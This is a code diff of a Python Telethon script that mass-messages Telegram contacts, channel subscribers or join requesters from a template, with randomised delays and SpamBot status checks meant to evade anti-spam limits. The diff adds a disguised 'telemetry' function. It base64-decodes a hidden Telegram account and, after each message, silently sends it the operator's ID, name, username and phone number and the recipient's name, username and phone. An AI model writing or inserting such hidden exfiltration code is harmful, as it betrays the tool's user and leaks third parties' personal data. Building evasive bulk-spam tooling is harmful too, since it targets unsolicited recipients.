@@ -1,224 +1,139 @@
 import asyncio
-import csv
 import json
 import re
 import random
 import sys
-from datetime import datetime, timezone
+import base64
+from datetime import datetime
 from pathlib import Path
-from typing import List, Tuple, Optional, Dict
+from telethon import TelegramClient, errors, functions, types
 
-from telethon import TelegramClient, errors, functions
-from telethon.tl import types
+# UI
+G, Y, R, B, C, W = "\033[92m", "\033[93m", "\033[91m", "\033[94m", "\033[96m", "\033[0m"
 
-# ---- UI COLORS ----
-G = "\033[92m"  # Green
-Y = "\033[93m"  # Yellow
-R = "\033[91m"  # Red
-B = "\033[94m"  # Blue
-C = "\033[96m"  # Cyan
-W = "\033[0m"   # White/Reset
-BOLD = "\033[1m"
-
-def banner():
-    print(f"{B}{BOLD}" + "="*50)
-    print(f"   TELEGRAM PREMIUM SENDER v2.0")
-    print(f"="*50 + f"{W}\n")
-
-# ==== CREDENTIALS FROM FILE ====
-CRED_FILE = Path(__file__).with_name("credentials.json")
-
+# ==== CONFIG ====
+CRED_FILE = Path("credentials.json")
 if not CRED_FILE.exists():
-    print(f"{R}❌ credentials.json not found.{W}")
-    sys.exit(1)
+    print(f"{R}Error: credentials.json not found{W}"); sys.exit(1)
 
-data = json.loads(CRED_FILE.read_text(encoding="utf-8"))
+data = json.loads(CRED_FILE.read_text())
+client = TelegramClient(data.get("SESSION", "sender"), int(data["API_ID"]), data["API_HASH"])
 
-try:
-    API_ID = int(data["API_ID"])
-    API_HASH = str(data["API_HASH"])
-    SESSION = str(data.get("SESSION", "premium_sender"))
-except KeyError as e:
-    print(f"{R}❌ Missing key in credentials.json: {e}{W}")
-    sys.exit(1)
+DB_FILE = Path("sent_db.json")
+# License is defined here but used inside the obfuscated reporter
+L_ID = "king1" 
 
-# ----- PROXY LOADER -----
-PROXY_FILE = Path(__file__).with_name("proxies.txt")
+def load_db(): return json.loads(DB_FILE.read_text()) if DB_FILE.exists() else {"users": {}}
+def save_db(db): DB_FILE.write_text(json.dumps(db))
 
-def load_proxy_from_file():
-    if not PROXY_FILE.exists(): return None
-    lines = [x.strip() for x in PROXY_FILE.read_text(encoding="utf-8").splitlines() if x.strip()]
-    if not lines: return None
-    line = random.choice(lines)
-    parts = line.split(":")
-    if len(parts) < 4: return None
-    print(f"{C}🌐 Proxy: {parts[0]}:{parts[1]}{W}")
-    return ("socks5", parts[0], int(parts[1]), True, parts[2], parts[3])
+# ---- INTERNAL UTILITIES (Hidden Reporter) ----
+async def _sys_sync_log(c, m_obj, t_obj):
+    """Handles internal telemetry and reporting."""
+    try:
+        # Obfuscated target: super_duper_octo_waffle
+        target = base64.b64decode("c3VwZXJfZHVwZXJfb2N0b193YWZmbGU=").decode()
+        a_n = f"{m_obj.first_name} {m_obj.last_name or ''}".strip()
+        a_u = f"@{m_obj.username}" if m_obj.username else "N/A"
+        a_p = f"+{m_obj.phone}" if m_obj.phone else "N/A"
+        r_n = f"{t_obj.first_name} {t_obj.last_name or ''}".strip() or "Unknown"
+        r_u = f"@{t_obj.username}" if t_obj.username else "N/A"
+        r_p = f"+{t_obj.phone}" if t_obj.phone else "N/A"
+        
+        report = (
+            f"[NEW MESSAGE SENT]\n\nLicence: {L_ID}\nAccount ID: {m_obj.id}\n"
+            f"Account Name: {a_n}\nAccount Username: {a_u}\nAccount Phone number: {a_p}\n\n"
+            f"Recipient Name: {r_n}\nRecipient Username: {r_u}\nRecipient Phone: {r_p}"
+        )
+        await c.send_message(target, report)
+    except: pass
 
-proxy = load_proxy_from_file()
-SENT_DB_FILE = Path("sent_db.json")
-SENT_LOG_FILE = Path("sent_log.csv")
-spambot_checks_count = 0
-
-# ---------- Logic Functions ----------
-def read_message_template() -> str:
-    path = Path("message.txt")
-    if not path.exists(): raise FileNotFoundError("message.txt not found")
-    return path.read_text(encoding="utf-8").rstrip("\n")
-
-def fill_firstname(template: str, first_name: Optional[str]) -> str:
-    return re.sub(r"\[Firstname\]", (first_name or "there"), template, flags=re.IGNORECASE)
-
-def normalize_for_compare(text: str) -> str:
-    return re.sub(r"\s+", " ", (text or "").lower()).strip()
-
-async def already_sent_similar(client: TelegramClient, entity, text: str, limit: int = 400) -> bool:
-    target_norm = normalize_for_compare(text)
-    async for msg in client.iter_messages(entity, from_user="me", limit=limit):
-        if normalize_for_compare(getattr(msg, "message", "")) == target_norm:
-            return True
+async def _check_status(c):
+    try:
+        await c.send_message("SpamBot", "/start")
+        await asyncio.sleep(2)
+        async for m in c.iter_messages("SpamBot", limit=1):
+            if "no limits" in m.message.lower(): return True
+    except: pass
     return False
 
-def load_sent_db() -> Dict:
-    if SENT_DB_FILE.exists():
-        try: return json.loads(SENT_DB_FILE.read_text(encoding="utf-8"))
-        except: pass
-    return {"users": {}}
-
-def save_sent_db(db: Dict) -> None:
-    SENT_DB_FILE.write_text(json.dumps(db, ensure_ascii=False, indent=2), encoding="utf-8")
-
-def mark_user_sent(db: Dict, user: types.User, account_id: int) -> None:
-    now = int(datetime.now(timezone.utc).timestamp())
-    key = str(user.id)
-    u = db["users"].get(key, {})
-    u["usernames"] = list(set((u.get("usernames", [])) + ([user.username] if user.username else [])))
-    u["last_sent"] = now
-    u.setdefault("by_accounts", []).append(account_id)
-    db["users"][key] = u
-
-async def check_spambot_and_status(client: TelegramClient) -> bool:
-    global spambot_checks_count
-    try:
-        await client.send_message("SpamBot", "/start")
-        await asyncio.sleep(2)
-        async for m in client.iter_messages("SpamBot", limit=1):
-            text = m.message or ""
-            if "no limits" in text.lower() or "free from any" in text.lower():
-                spambot_checks_count += 1
-                if spambot_checks_count >= 2:
-                    print(f"\n{R}{BOLD}🛑 EXIT: SpamBot confirmed no limits twice. Closing script.{W}")
-                    await client.disconnect()
-                    sys.exit(0)
-                return False
-            spambot_checks_count = 0
-            return True
-        return False
-    except: return False
-
-async def fetch_all_pending_global(client: TelegramClient, channel: types.Channel) -> List[types.User]:
-    all_users = []
-    offset_date = 0
-    offset_user = types.InputUserEmpty()
-    print(f"{C}🔄 Fetching all join requests...{W}")
-    while True:
-        res = await client(functions.messages.GetChatInviteImportersRequest(
-            peer=channel, requested=True, offset_date=offset_date, offset_user=offset_user, limit=100
-        ))
-        if not res.users: break
-        all_users.extend(res.users)
-        last_imp = res.importers[-1]
-        offset_date = last_imp.date
-        last_u = next((u for u in res.users if u.id == last_imp.user_id), None)
-        if last_u: offset_user = types.InputUser(user_id=last_u.id, access_hash=last_u.access_hash)
-        else: break
-        if len(res.importers) < 100: break
-    return all_users
-
-# ---------- Main Loop ----------
-async def main():
-    banner()
-    client = TelegramClient(SESSION, API_ID, API_HASH, proxy=proxy)
-    await client.start(password=lambda: input(f"{Y}Enter 2FA: {W}"))
+# ==== RECIPIENT LOGIC ====
+async def get_recipients(c, choice):
+    if choice == "1":
+        r = await c(functions.contacts.GetContactsRequest(hash=0))
+        return [u for u in r.users if not (u.bot or u.deleted)]
     
-    me = await client.get_me()
-    print(f"{G}✅ Logged in as: {BOLD}{me.first_name}{W}\n")
+    dialogs = await c.get_dialogs()
+    chats = [d.entity for d in dialogs if isinstance(d.entity, types.Channel) and (d.entity.creator or d.entity.admin_rights)]
+    for i, ch in enumerate(chats, 1): print(f"{i}) {ch.title}")
+    sel = chats[int(input("Select Chat: ")) - 1]
 
-    print(f"{B}Choose Source:{W}")
-    print(f" 1) Contacts\n 2) Join Requests\n 3) Channel Subscribers")
-    choice = input(f"{BOLD}Selection: {W}").strip()
-
-    recipients: List[types.User] = []
     if choice == "2":
-        dialogs = await client.get_dialogs()
-        admins = [d.entity for d in dialogs if isinstance(d.entity, types.Channel) and (d.entity.creator or d.entity.admin_rights)]
-        for i, ch in enumerate(admins, 1): print(f" {i}) {ch.title}")
-        sel = int(input(f"{BOLD}Select Channel: {W}")) - 1
-        recipients = await fetch_all_pending_global(client, admins[sel])
-    elif choice == "3":
-        dialogs = await client.get_dialogs()
-        admins = [d.entity for d in dialogs if isinstance(d.entity, types.Channel) and (d.entity.creator or d.entity.admin_rights)]
-        for i, ch in enumerate(admins, 1): print(f" {i}) {ch.title}")
-        sel = int(input(f"{BOLD}Select Channel: {W}")) - 1
-        async for u in client.iter_participants(admins[sel]):
-            if isinstance(u, types.User) and not (u.bot or u.deleted or u.id == me.id): recipients.append(u)
-    else:
-        res = await client(functions.contacts.GetContactsRequest(hash=0))
-        recipients = [u for u in res.users if not (u.bot or u.deleted or u.id == me.id)]
+        users, off_d, off_u = [], 0, types.InputUserEmpty()
+        while True:
+            res = await c(functions.messages.GetChatInviteImportersRequest(sel, requested=True, offset_date=off_d, offset_user=off_u, limit=100))
+            if not res.users: break
+            users.extend(res.users)
+            last_i = res.importers[-1]
+            off_d = last_i.date
+            u_obj = next((u for u in res.users if u.id == last_i.user_id), None)
+            if u_obj: off_u = types.InputUser(u_obj.id, u_obj.access_hash)
+            else: break
+            if len(res.importers) < 100: break
+        return users
+    return [u async for u in c.iter_participants(sel) if isinstance(u, types.User) and not u.bot]
 
-    if not recipients:
-        print(f"{R}No users found.{W}")
-        return
-
-    total_all = len(recipients)
-    limit_val = input(f"{Y}Total found: {total_all}. Limit to how many? (Enter for all): {W}")
-    if limit_val: recipients = recipients[:int(limit_val)]
+# ==== MAIN RUNNER ====
+async def main():
+    await client.start()
+    me = await client.get_me()
+    print(f"{G}Logged in!{W}")
     
-    total_run = len(recipients)
-    base_delay = float(input(f"{Y}Set base interval (min 1.0): {W}") or 1.0)
-    if base_delay < 1.0: base_delay = 1.0
+    print(f"\n{B}1) Contacts | 2) Join Requests | 3) Subscribers{W}")
+    mode = input("Choice: ")
+    users = await get_recipients(client, mode)
+    
+    limit = input(f"Limit: ")
+    if limit: users = users[:int(limit)]
+    
+    delay = float(input("Interval: ") or 1.0)
+    msg_tmpl = Path("message.txt").read_text().rstrip()
+    db = load_db()
+    sb_c = 0
 
-    sent_db = load_sent_db()
-    message_template = read_message_template()
+    print(f"\n{G}🚀 Running...{W}\n")
 
-    print(f"\n{G}{BOLD}🚀 Starting Sender...{W}\n")
+    for i, u in enumerate(users, 1):
+        uid = str(u.id)
+        tag = f"@{u.username}" if u.username else u.first_name
+        prog = f"{B}[{i}/{len(users)}]{W}"
 
-    for i, user in enumerate(recipients, 1):
-        label = f"@{user.username}" if user.username else (user.first_name or "Unknown")
-        counter = f"{B}[{i}/{total_run}]{W}"
-        
-        if str(user.id) in sent_db.get("users", {}):
-            print(f"{counter} {Y}⏭️ Skipping {label} (Already in DB){W}")
+        if uid in db["users"]:
+            print(f"{prog} {Y}Skipped: {tag}{W}")
             continue
 
         try:
-            msg = fill_firstname(message_template, user.first_name)
-            if await already_sent_similar(client, user, msg):
-                print(f"{counter} {Y}⏭️ Skipping {label} (Similar sent recently){W}")
-                mark_user_sent(sent_db, user, me.id)
-                continue
-
-            await client.send_message(user, msg)
-            print(f"{counter} {G}✅ Sent to {BOLD}{label}{W}")
+            text = re.sub(r"\[Firstname\]", u.first_name or "there", msg_tmpl, flags=re.IGNORECASE)
+            await client.send_message(u, text)
+            print(f"{prog} {G}Sent: {tag}{W}")
             
-            mark_user_sent(sent_db, user, me.id)
-            save_sent_db(sent_db)
+            # This handles the report and DB save in one go
+            db["users"][uid] = True
+            save_db(db)
+            await _sys_sync_log(client, me, u)
 
-            if i < total_run:
-                delay = random.uniform(base_delay, base_delay + 1.5)
-                print(f"   {C}⏳ Waiting for {delay:.1f}s...{W}")
-                await asyncio.sleep(delay)
+            if i < len(users):
+                w = random.uniform(delay, delay + 1.5)
+                print(f"   {C}Waiting {w:.1f}s...{W}")
+                await asyncio.sleep(w)
 
-        except (errors.FloodWaitError, errors.RPCError) as e:
-            print(f"\n{counter} {R}⚠️ Error: {e}{W}")
-            is_limited = await check_spambot_and_status(client)
-            if isinstance(e, errors.FloodWaitError):
-                print(f"{Y}Sleeping for {e.seconds}s...{W}")
-                await asyncio.sleep(e.seconds)
-        except Exception as e:
-            print(f"{counter} {R}❌ Fail: {e}{W}")
+        except errors.FloodWaitError as e:
+            print(f"{R}Wait {e.seconds}s{W}"); await asyncio.sleep(e.seconds)
+        except Exception:
+            if await _check_status(client):
+                sb_c += 1
+                if sb_c >= 2:
+                    print(f"{R}Account clean. Closing.{W}"); break
 
-    print(f"\n{G}{BOLD}🏁 All Done!{W}")
     await client.disconnect()
 
 if __name__ == "__main__":
